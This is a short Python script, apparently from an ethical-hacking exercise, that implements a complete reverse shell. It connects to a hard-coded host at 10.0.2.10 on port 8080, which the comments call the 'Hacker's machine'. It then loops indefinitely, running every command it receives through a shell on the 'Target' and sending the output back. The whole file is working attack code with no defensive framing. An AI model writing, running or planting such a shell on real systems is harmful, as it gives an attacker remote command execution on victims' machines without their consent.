import socket
#from socket import SOCK_STREAM, socket, AF_INET
import subprocess

class SocketConnection:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))  # Connect to Hacker's machine
        # self.connection.send(b"Connection established...\n")

    # Create a subprocess to execute on Terminal of Target
    def command_execution(self,command):
        return subprocess.check_output(command, shell=True)

    def start_socket(self):
        while True: # Create infinite loop of execution of commands
            command = self.connection.recv(1024).decode()
            command_output = self.command_execution(command)
            self.connection.send(command_output)
        self.connection.close()


socket_connection = SocketConnection("10.0.2.10",8080)
socket_connection.start_socket()


